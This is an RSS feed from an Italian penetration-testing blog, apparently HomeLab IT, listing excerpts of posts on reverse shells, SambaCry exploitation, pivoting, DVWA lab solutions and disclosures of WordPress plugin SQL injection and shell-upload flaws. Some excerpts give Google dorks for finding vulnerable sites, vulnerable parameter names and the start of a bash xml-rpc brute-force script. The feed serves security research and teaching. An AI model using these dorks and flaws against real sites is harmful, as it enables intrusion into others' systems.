@@ -1,0 +1,1289 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Posts on HomeLab IT</title>
+    <link>https://www.homelab.it/posts/</link>
+    <description>Recent content in Posts on HomeLab IT</description>
+    <image>
+      <url>https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 21 Jun 2021 18:05:46 +0200</lastBuildDate><atom:link href="https://www.homelab.it/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Come migrare da una reverse shell a meterpeter</title>
+      <link>https://www.homelab.it/index.php/2017/06/21/migrare-da-reverse-shell-a-meterpeter/</link>
+      <pubDate>Mon, 21 Jun 2021 18:05:46 +0200</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2017/06/21/migrare-da-reverse-shell-a-meterpeter/</guid>
+      <description>Durante un pen test potreste avere nella necessità di utilizzare un exploit che non fa parte del framework metasploit, di conseguenza dovreste rinunciare anche ad una shell meterpeter.
+In questo articolo cercherò di spiegare come eseguire una classica reverse shell (netcat, bash, python ecc…) su metasploit per poi migrare su una sessione meterpeter.
+Perchè meterpeter? Utilizzare una shell meterpeter ha moltissimi vantaggi tra cui:
+ Sfruttare i moduli di “post exploitation” per provare a scalare i privilegi.</description>
+    </item>
+    
+    <item>
+      <title>Sfruttare la vulnerablitià Sambacry nei dispositivi QNAP/ARM</title>
+      <link>https://www.homelab.it/index.php/2017/06/11/sfruttare-la-vulnerablitia-sambacry-nei-dispositivi-qnap-e-arm/</link>
+      <pubDate>Fri, 11 Jun 2021 18:05:46 +0200</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2017/06/11/sfruttare-la-vulnerablitia-sambacry-nei-dispositivi-qnap-e-arm/</guid>
+      <description>Eccomi di ritorno dalle meritate ferie, e come promesso, sono pronto a mettere nero su bianco i miei test effettuati con la vulnerabilità SambaCry.
+Questo post potrà esservi utile per sfruttare la vulnerabilità SambaCry nei server samba installati nei dispositivi nas QNAP o ARM in generale, senza dover utilizzare il framework Metasploit.
+Non voglio dilungarmi nella descrizione della vulnerabilità, googlando SambaCry o CVE-2017-7494 troverete tonnellate di materiale.
+In poche parole questo bug permette di eseguire comandi sul server samba remoto, l’unico requisito è l’accesso in scrittura di una cartella condivisa!</description>
+    </item>
+    
+    <item>
+      <title>BackBox4Browser: BackBox in a Browser</title>
+      <link>https://www.homelab.it/index.php/2016/06/25/backbox4browser-backbox-browser/</link>
+      <pubDate>Sat, 25 Jun 2016 19:57:23 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/06/25/backbox4browser-backbox-browser/</guid>
+      <description>Da una brillante idea di jgamblin (KaliBrowser), ho provato a creare un’immagine docker con la distribuzione BackBox 4 gestibile comodamente da browser.
+Premetto che non avevo mai smanettato con i docker prima d’ora, quindi per i più esperti i miei Dockerfile potrebbero risultare orribili.
+Dopo una settimana di lavoro sono riuscito a creare quattro versioni:
+ BackBox4Browser XFCE – [930MB] – [Dockerfile]
+— Backbox 4 + XFCE (No tools) BackBox4Browser XFCE Full – [2GB] – [Dockerfile]</description>
+    </item>
+    
+    <item>
+      <title>NetHunter e Samsung Galaxy S5:Ecco la mia esperienza</title>
+      <link>https://www.homelab.it/index.php/2016/05/16/nethunter-samsung-galaxy-s5/</link>
+      <pubDate>Mon, 16 May 2016 19:26:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/05/16/nethunter-samsung-galaxy-s5/</guid>
+      <description>Al giorno d’oggi per eseguire attacchi informatici le alternative alla classica workstation sono svariate: tablet, smartphone, raspberry fino ad arrivare ai droni.
+Naturalmente ci sono anche i lati “white” della medaglia, ad esempio chi lavora nell’ IT security può trarre vantaggio nel poter testare applicativi o infrastrutture comodamente dal proprio device portatile.L’azienda Offensive Security, nota per la famosa Kali Linux e per le prestigiosi certificazioni, ha ideato una distribuzione di penetration testing appositamente per i dispositivi mobile: Kali Linux NetHunter.</description>
+    </item>
+    
+    <item>
+      <title>SSH e Meterpeter pivoting</title>
+      <link>https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/</link>
+      <pubDate>Thu, 21 Apr 2016 19:34:53 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/</guid>
+      <description>Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.
+Pivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).
+Faccio un piccolo esempio in cui ci sono tre attori:
+ Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation.</description>
+    </item>
+    
+    <item>
+      <title>DVWA File Upload – Soluzione Completa &#43; Bonus XSS</title>
+      <link>https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/</link>
+      <pubDate>Wed, 02 Mar 2016 22:35:55 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/</guid>
+      <description>Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.
+I requisiti sono:
+ DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.
+DVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php.</description>
+    </item>
+    
+    <item>
+      <title>DVWA SQL injection &#43; SQL Injection Blind &#43; Bonus XSS</title>
+      <link>https://www.homelab.it/index.php/2016/01/14/dvwa-sql-injection/</link>
+      <pubDate>Thu, 14 Jan 2016 21:07:51 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/01/14/dvwa-sql-injection/</guid>
+      <description>Ciao a tutti, la write-up di oggi riguarderà la vulnerabilità DVWA SQL Injection.
+I requisiti sono:
+ Conoscenze minime MySQL Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data  L’app DVWA propone due tipi di vulnerabilità, SQL Injection, e SQL Injection Blind.
+Inizierò subito con la vulnerabilità SQL Injection Blind dato che è la più complicata e divertente da scovare.
+Il risultato di un attacco SQL Injection nei migliori dei casi restituirà il classico messaggio:</description>
+    </item>
+    
+    <item>
+      <title>DVWA Command Injection – Soluzione Completa</title>
+      <link>https://www.homelab.it/index.php/2016/01/07/dvwa-command-injection-soluzione-completa/</link>
+      <pubDate>Thu, 07 Jan 2016 17:20:02 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/01/07/dvwa-command-injection-soluzione-completa/</guid>
+      <description>DVWA Command Injection – Soluzione Completa Bentornati, o benarrivati, nel post di oggi troverete la risoluzione della vulnerabilità: DVWA Command Injection, i requisiti sono:
+ Qualsiasi browser disponibile Minima conoscenza di Linux, in particolare l’abilità nell’eseguire comandi multipli.  L’obbiettivo del test è quello di eseguire comandi arbitrari sul sistema operativo che ospita l’applicativo.
+Il target è una semplice paginetta composta da un form nella quale viene richiesto di inserire un indirizzo ip da pingare.</description>
+    </item>
+    
+    <item>
+      <title>DVWA XSS Reflected – Soluzione Completa</title>
+      <link>https://www.homelab.it/index.php/2016/01/02/dvwa-xss-reflected-soluzione-completa/</link>
+      <pubDate>Sat, 02 Jan 2016 18:24:57 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/01/02/dvwa-xss-reflected-soluzione-completa/</guid>
+      <description>Eccoci alla risoluzione della prima vulnerabilità che ho affrontato DVWA XSS Reflected, i requisiti per affrontare questo test sono:
+ Browser senza filtri XSS, consiglio Mozilla **Firefox
+**  L’obbiettivo di questo test è iniettare del codice javascript all’interno di una pagina web che stampa a video caratteri passati tramite un form.
+La richiesta avviene tramite metodo GET e la variabile target si chiama “name“.
+Analizzando il sorgente html si può notare come il valore da me inviato (homelab) venga stampato a video tra i tag</description>
+    </item>
+    
+    <item>
+      <title>DVWA – Damn Vulnerable Web Application</title>
+      <link>https://www.homelab.it/index.php/2015/12/24/dvwa-damn-vulnerable-web-application/</link>
+      <pubDate>Thu, 24 Dec 2015 15:06:22 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/12/24/dvwa-damn-vulnerable-web-application/</guid>
+      <description>Avete voglia di testate le vostre conoscenze o skills di penetration testing per quanto riguardo il campo web applicativo senza problemi legali?
+Avete voglia di conoscere le possibili mitigation da attuare contro le maggiori vulnerabilità?
+Bene! Damn Vulnerable Web Application fa proprio al caso vostro!
+DVWA è una web application scritta in PHP e MySQL installabile in qualsiasi ambiente in cui sia presente un web server, php e mysql.
+L’applicazione è stata creata e concepita piena zeppa di vulnerabilità più o meno facili da scovare, il livello di difficoltà può essere configurato come:</description>
+    </item>
+    
+    <item>
+      <title>From Dynamic to Static e WordPress non lo buchi più</title>
+      <link>https://www.homelab.it/index.php/2015/11/07/from-dynamic-to-static-e-wordpress-non-lo-buchi-piu/</link>
+      <pubDate>Sat, 07 Nov 2015 18:11:37 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/11/07/from-dynamic-to-static-e-wordpress-non-lo-buchi-piu/</guid>
+      <description>Sorgente immagine: https://greggbanse.com/
+Introduzione Alzi la mano chi non ha storto il naso leggendo il titolo di questo articolo?
+Sicuramente moltissimi ed è stata la mia stessa reazione quando mi sono imbattuto in un post dal titolo The Unhackable WordPress Blog scritto da Matthew Bryant (mandatory).
+Incuriosito dal titolo, volutamente provocatorio, ho continuato la lettura fino alla fine e sono rimasto molto entusiasta, in pratica il buon Matthew Bryant espone la sua teoria che si basa sul trovare un alto livello di sicurezza convertendo da dinamico a statico il CMS WordPress (e non solo).</description>
+    </item>
+    
+    <item>
+      <title>teXSState online, pasta, pizza e mandolino</title>
+      <link>https://www.homelab.it/index.php/2015/10/18/texsstate-online-pasta-pizza-e-mandolino/</link>
+      <pubDate>Sun, 18 Oct 2015 17:14:57 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/10/18/texsstate-online-pasta-pizza-e-mandolino/</guid>
+      <description>Sorgente Immagine: https://cdn.vectorstock.com
+Introduzione Ciao a tutti, oggi voglio proporvi un post particolare frutto di alcune ore libere ricavate nelle ultime settimane.
+Un po per necessità e un po per curiosità ho cominciato ad approfondire l’argomento Cross-site Scripting (XSS).
+Spulciando blog, documentazioni, e social mi sono imbattuto in vari security researcher, uno dei quali specializzato in vulnerabilità XSS: Ashar Javed.
+Le sue referenze parlano da sole, infatti è presente in tutte le Security Hall of Fame dei maggiori colossi informatici: Google, Microsoft, Facebook, Twitter ecc…</description>
+    </item>
+    
+    <item>
+      <title>Come installare VMware Workstation Player e Pro su Kali Linux 2.0</title>
+      <link>https://www.homelab.it/index.php/2015/09/07/come-installare-vmware-workstation-player-e-pro-su-kali-linux-2-0/</link>
+      <pubDate>Mon, 07 Sep 2015 20:22:46 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/09/07/come-installare-vmware-workstation-player-e-pro-su-kali-linux-2-0/</guid>
+      <description>Sorgente Immagine: https://www.vmware.com/files/images/vmrc/VMware_logo_blk_RGB_300dpi.jpg
+Kali Linux è una distribuzione concepita per essere utilizzata principalmente durante i penetration test e non come distro “da tutti i giorni”.
+Basti pensare che in fase di installazione il setup non richiede la creazione di alcun tipo di utente non privilegiato.
+Per testare la distribuzione ho cominciato ad utilizzarla giornalmente e di conseguenza ho cominciato a riscontare le prime necessità.
+Uno dei primi software che ho provato a installare è VMware Workstation.</description>
+    </item>
+    
+    <item>
+      <title>IDLE SCAN: ZOMBIE ATTACK</title>
+      <link>https://www.homelab.it/index.php/2015/08/20/idle-scan-zombie-attack/</link>
+      <pubDate>Thu, 20 Aug 2015 16:09:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/08/20/idle-scan-zombie-attack/</guid>
+      <description>Sorgente Immagine: http://www.androidworld.it
+Tranquilli non voglio parlare di nessun virus, epidemia, o serie tv (anche se The Walkin Dead ve la consiglio).
+L’argomento di oggi è l’IDLE SCAN, ovvero una tecnica sofisticata di port scanning TCP ideata da Salvatore Sanfilippo, il quale permette di rilevare servizi attivi su un determinato host camuffando il proprio indirizzo sorgente (spoofing).
+Come viene nascosto l’ip sorgente?
+Impersonando un terzo host della rete il cui stato è dormiente (idle, zombie), infatti la tecnica coinvolge tre interpreti:</description>
+    </item>
+    
+    <item>
+      <title>Come creare uno sniffer di rete in Python</title>
+      <link>https://www.homelab.it/index.php/2015/08/16/come-creare-uno-sniffer-di-rete-in-python/</link>
+      <pubDate>Sun, 16 Aug 2015 17:03:43 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/08/16/come-creare-uno-sniffer-di-rete-in-python/</guid>
+      <description>Se anche voi siete appassionati di penetration testing, vi potrà tornare utile creare dei tools personalizzati da utilizzare durante le tue analisi.
+Python è un fantastico e potente linguaggio di programmazione che mette a disposizione tantissime librerie che possono fare al case nostro, con il vantaggio di essere di facile comprensione.
+Qui di seguito troverete il codice sorgente, commentato in maniera dettagliata, di uno sniffer di rete principalmente dedicato alla cattura del traffico POP/IMAP.</description>
+    </item>
+    
+    <item>
+      <title>WP Fast Cache 1.4 and below CSRF Stored/Reflected XSS</title>
+      <link>https://www.homelab.it/index.php/2015/05/27/wp-fast-cache-csrf-xss/</link>
+      <pubDate>Wed, 27 May 2015 20:02:05 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/05/27/wp-fast-cache-csrf-xss/</guid>
+      <description>####################### Exploit Title : WP Fast Cache 1.4 and below CSRF Stored/Reflected XSS# Exploit Author : Claudio Viviani# Website Author: http://www.homelab.ithttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)# Vendor Homepage : https://wordpress.org/plugins/wp-fast-cache/# Software Link : https://downloads.wordpress.org/plugin/wp-fast-cache.1.4.zip# Dork Google: index of wp-fast-cache# Date : 2015-05-11# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### InfoWP Fast Cache is vulnerable to CSRF attacks, which can also be combined with stored/reflected XSS attacks (authenticated administrators only).</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.8 Unprotected Mail Page</title>
+      <link>https://www.homelab.it/index.php/2015/05/22/wordpress-video-gallery-2-8-unprotected-mail-page/</link>
+      <pubDate>Fri, 22 May 2015 09:50:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/05/22/wordpress-video-gallery-2-8-unprotected-mail-page/</guid>
+      <description>###################### # Exploit Title : WordPress Video Gallery 2.8 Unprotected Mail Page # Exploit Author : Claudio Viviani # Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery # Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip # Dork Google: index of &amp;#34;contus-video-gallery&amp;#34; # Date : 2015-04-05 # Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from Unprotected Mail Page. This vulnerability is exploitable to dos, phishing, mailbombing, spam... The &amp;#34;email&amp;#34; ajax action is callable from any guest visitor (/contus-video-gallery/hdflvvideoshare.</description>
+    </item>
+    
+    <item>
+      <title>BackBox 4.2 is out! Ecco come aggiornare la release…</title>
+      <link>https://www.homelab.it/index.php/2015/04/27/backbox-4-2-is-out-ecco-come-aggiornare-la-release/</link>
+      <pubDate>Mon, 27 Apr 2015 20:06:46 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/27/backbox-4-2-is-out-ecco-come-aggiornare-la-release/</guid>
+      <description>Oggi ho avuto l’immenso piacere di leggere che è uscita la release 4.2 della distribuzione BackBox 4.2 made in italy orientata al penetration testing!
+Oltre al sito ufficiale, l’annuncio è stato rilasciato sul sito (OverSecurity) di uno dei membri del BackBox Team: Andrea Draghetti
+Le novità più importanti sono le seguenti:
+Changelog  Preinstalled Linux Kernel 3.16 New Ubuntu 14.04.2 base Ruby 2.1 Installer with LVM and Full Disk Encryption options Handy Thunar custom actions RAM wipe at shutdown/reboot System improvements Upstream components Bug corrections Performance boost Improved Anonymous mode Predisposition to ARM architecture (armhf Debian packages) Predisposition to BackBox Cloud platform New and updated hacking tools: beef-project, crunch, fang, galleta, jd-gui, metasploit-framework, pasco, pyew, rifiuti2, setoolkit, theharvester, tor, torsocks, volatility, weevely, whatweb, wpscan, xmount, yara, zaproxy  Upgrade Andrea, oltre a riferire le ultime modifiche, ha rilasciato una mini-guida per aggiornare BackBox dalla versione 4.</description>
+    </item>
+    
+    <item>
+      <title>Come limitare gli utenti ssh ad un singolo comando</title>
+      <link>https://www.homelab.it/index.php/2015/04/27/come-limitare-gli-utenti-ssh-ad-un-singolo-comando/</link>
+      <pubDate>Mon, 27 Apr 2015 14:29:41 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/27/come-limitare-gli-utenti-ssh-ad-un-singolo-comando/</guid>
+      <description>Introduzione Oggi mi sono trovato nella necessità di dover utilizzare un utente, tramite protocollo ssh, per eseguire un singolo e semplice comando da remoto verso un server linux.
+Per ragioni di sicurezza mi sono chiesto se esistesse la possibilità di limitare tale utenza all’esecuzione di un unico programma, senza ricorrere a jail (chroot) o shell “castrate” di terze parti.
+Googolando e leggendo il man di ssh ho scoperto una soluzione facile e carina:</description>
+    </item>
+    
+    <item>
+      <title>Virtualization 2.0 for Dummies (Free eBook) Download</title>
+      <link>https://www.homelab.it/index.php/2015/04/24/virtualization-2-0-for-dummies-free-ebook/</link>
+      <pubDate>Fri, 24 Apr 2015 16:04:43 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/24/virtualization-2-0-for-dummies-free-ebook/</guid>
+      <description>VMware ha rilasciato un eBook gratuito intitolato “Virtualization 2.0 for Dummies” scritto da Hanish Rathod e Josh Townsend.
+DOWNLOAD</description>
+    </item>
+    
+    <item>
+      <title>WordPress NEX-Forms 3.0 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/21/wordpress-nex-forms-sqli/</link>
+      <pubDate>Mon, 20 Apr 2015 23:40:41 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/21/wordpress-nex-forms-sqli/</guid>
+      <description>####################### Exploit Title : WordPress NEX-Forms 3.0 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Website Author: http://www.homelab.ithttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)# Vendor Homepage : https://wordpress.org/plugins/nex-forms-express-wp-form-builder/# Software Link : https://downloads.wordpress.org/plugin/nex-forms-express-wp-form-builder.3.0.zip# Dork Google: inurl:nex-forms-express-wp-form-builder# index of nex-forms-express-wp-form-builder# Date : 2015-03-29# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### Info:The &amp;#34;submit_nex_form&amp;#34; ajax function is affected from SQL Injection vulnerability#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>CoinVault ransomware: come (provare a) recuperare i files criptati</title>
+      <link>https://www.homelab.it/index.php/2015/04/18/coinvault-ransomware-come-recuperare-i-files-criptati/</link>
+      <pubDate>Fri, 17 Apr 2015 22:19:21 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/18/coinvault-ransomware-come-recuperare-i-files-criptati/</guid>
+      <description>Introduzione I ransomware sono i nuovi malware (Malicious Software) che non solo infettano il sistema del malcapitato, ma criptano tutti i dati sensibili presenti sul proprio drive locale, dischi/pendrive collegate e, nello sciagurato caso, anche directory/unità di rete montate.
+Una volta criptati i dati non sono più leggibili, a meno che non si paghi un riscatto (ransom in inglese) seguendo delle precise istruzioni rilasciate dagli sviluppatori del virus.
+CoinVault ransomware CoinVault è un dei moltissimi ransomware che stanno infettando moltissimi utenti chiedendo un riscatto in bitcoin, la famosissima moneta elettronica.</description>
+    </item>
+    
+    <item>
+      <title>MS15-034 HTTP.sys (IIS) DoS And Possible Remote Code Execution – AGGIORNAMENTO CRITICO</title>
+      <link>https://www.homelab.it/index.php/2015/04/17/ms15-034-http-sys-iis-dos-and-possible-remote-code-execution-aggiornamento-critico/</link>
+      <pubDate>Thu, 16 Apr 2015 22:01:31 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/17/ms15-034-http-sys-iis-dos-and-possible-remote-code-execution-aggiornamento-critico/</guid>
+      <description>Introduzione E’ stata rilevato un nuovo attacco tramite exploit verso il demone IIS (Internet Information Server) dei sistemi operativi Windows.
+In realtà la libreria vulnerabile si chiama HTTP.sys che viene utilizzata maggiormente dal demone ISS, ma non solo, teoricamente tutti i programmi che ne usufruiscono sono a rischio!
+A cosa serve la libreria HTTP.sys?
+Per farla breve e semplice la sua funzione è quella di elaborare richieste HTTP.
+Tipologia di vulerabilità e Exploit Microsoft ha classificato questa vulnerabilità come Remote Code Execution, ma per adesso pubblicamente sono stati rilasciati exploit ti tipologia DoS:</description>
+    </item>
+    
+    <item>
+      <title>Simple WordPress Xml-rpc Brute Force written in bash with cURL</title>
+      <link>https://www.homelab.it/index.php/2015/04/16/simple-wordpress-xml-rpc-brute-force-in-bash-with-curl/</link>
+      <pubDate>Wed, 15 Apr 2015 23:28:05 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/16/simple-wordpress-xml-rpc-brute-force-in-bash-with-curl/</guid>
+      <description>Simple WordPress Xml-rpc Brute Force written in bash with curl #!/bin/sh###################### # # Scripted By : Claudio Viviani # http://www.homelab.it # http://adf.ly/1F1MNw (Full HomelabIT Archive Exploit) # http://ffhd.homelab.it (Free Fuzzy Hashes Database) # # info@homelab.it # homelabit@protonmail.ch # # https://www.facebook.com/homelabit # https://twitter.com/homelabit # https://plus.google.com/+HomelabIt1/ # https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww # #####################url=$1user=$2wordlist=$3if [ -z &amp;#34;$wordlist&amp;#34; ]; thenecho &amp;#34;Usage: $0 http://TARGT username wordlist.txt&amp;#34;exit 1elif [ !</description>
+    </item>
+    
+    <item>
+      <title>WordPress Ajax Store Locator SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/15/wordpress-ajax-store-locator-sql-injection-vulnerability/</link>
+      <pubDate>Wed, 15 Apr 2015 15:42:06 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/15/wordpress-ajax-store-locator-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Ajax Store Locator &amp;lt;= 1.2 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356# Software Link : Premium# Dork Google: inurl:ajax-store-locator# index of ajax-store-locator # Date : 2015-03-29# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### Info:The &amp;#34;sl_dal_searchlocation_cbf&amp;#34; ajax function is affected from SQL Injection vulnerability&amp;#34;StoreLocation&amp;#34; var is not sanitized##################### Discovered By : Claudio Viviani http://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.8 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/13/wordpress-video-gallery-2-8-sql-injection-vulnerability/</link>
+      <pubDate>Mon, 13 Apr 2015 18:47:15 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/13/wordpress-video-gallery-2-8-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Video Gallery 2.8 SQL Injection Vulnerabilitiy# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip# Dork Google: inurl:/wp-admin/admin-ajax.php?action=googleadsense# Date : 2015-04-04# Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from SQL injection ###################### # Vulnerability Disclosure Timeline: 2015-04-04: Discovered vulnerability 2015-04-06: Vendor Notification 2015-04-07: Vendor Response/Feedback 2015-04-07: Vendor Send Fix/Patch (same version number) 2015-04-13: Public Disclosure ####################### Discovered By : Claudio Viviani http://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/12/wordpress-n-media-website-contact-form-shell-upload/</link>
+      <pubDate>Sun, 12 Apr 2015 21:03:23 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/12/wordpress-n-media-website-contact-form-shell-upload/</guid>
+      <description>###################### # Exploit Title : WordPress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability # Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/website-contact-form-with-file-upload.1.3.4.zip # Date : 2015-04-1# Dork Google: index of website-contact-form-with-file-upload index of /uploads/contact_files/ # Tested on : Linux BackBox 4.0 / curl 7.35.0 ##################### # Info : The &amp;#34;upload_file()&amp;#34; ajax function is affected from unrestircted file upload vulnerability. ##################### Discovered By : Claudio Viviani http://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Duplicator 0.5.14 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/10/wordpress-duplicator-0-5-14-sql-injection-vulnerability/</link>
+      <pubDate>Fri, 10 Apr 2015 08:46:57 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/10/wordpress-duplicator-0-5-14-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Duplicator 0.5.14 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://lifeinthegrid.com/labs/duplicator/# Software Link : https://downloads.wordpress.org/plugin/duplicator.0.5.14.zip# Date : 2015-04-08# Tested on : Linux / Mozilla Firefox ####################### DescriptionWordPress Duplicator 0.5.14 suffers from remote SQL Injection VulnerabilityLocation file: /view/actions.phpThis is the bugged ajax functions wp_ajax_duplicator_package_delete:function duplicator_package_delete() {DUP_Util::CheckPermissions(&amp;#39;export&amp;#39;);try {global $wpdb;$json	= array();$post	= stripslashes_deep($_POST);$tblName	= $wpdb-&amp;gt;prefix .</description>
+    </item>
+    
+    <item>
+      <title>WordPress All In One WP Security &amp; Firewall 3.9.0 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/07/wordpress-all-in-one-wp-security-sql-injection-vulnerability/</link>
+      <pubDate>Tue, 07 Apr 2015 07:03:33 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/07/wordpress-all-in-one-wp-security-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress All In One WP Security &amp;amp; Firewall 3.9.0 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/# Software Link : https://mega.co.nz/#!DJAEBLBS!IBiukGo-pirelHmsRV80xZDHIvpqZKtTIqsD8YrMf7U# Date : 2015-04-05# Tested on : Linux / Mozilla Firefox####################### DescriptionWordPress All In One WP Security &amp;amp; Firewall 3.9.0 suffers from Blind SQL Injection vulnerabilityThere are some pages with wordpress esc_sql function.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Work the flow file upload 2.5.2 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/</link>
+      <pubDate>Sat, 04 Apr 2015 17:05:53 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Work the flow file upload 2.5.2 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Software Link : https://downloads.wordpress.org/plugin/work-the-flow-file-upload.2.5.2.zip# Date : 2015-03-14# Tested on : Linux BackBox 4.0 / curl 7.35.0####################### Description:Work the Flow File Upload. Embed Html5 User File Uploads and Workflows into pages and posts. Multiple file Drag and Drop upload, Image Gallery display, Reordering and Archiving.</description>
+    </item>
+    
+    <item>
+      <title>WP Marketplace 2.4.0  Remote Code Execution (Add WP Admin)</title>
+      <link>https://www.homelab.it/index.php/2015/03/24/wp-marketplace-rce/</link>
+      <pubDate>Tue, 24 Mar 2015 21:09:38 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/03/24/wp-marketplace-rce/</guid>
+      <description>___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---&amp;#39; ___ ___ __ __ __ | Y .---.-.----| |--.-----| |_.-----| .---.-.----.-----.|. | _ | _| &amp;lt;| -__| _| _ | | _ | __| -__||. \_/ |___._|__| |__|__|_____|____| __|__|___._|____|_____||: | | |__| |::.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.7 SQL Injection</title>
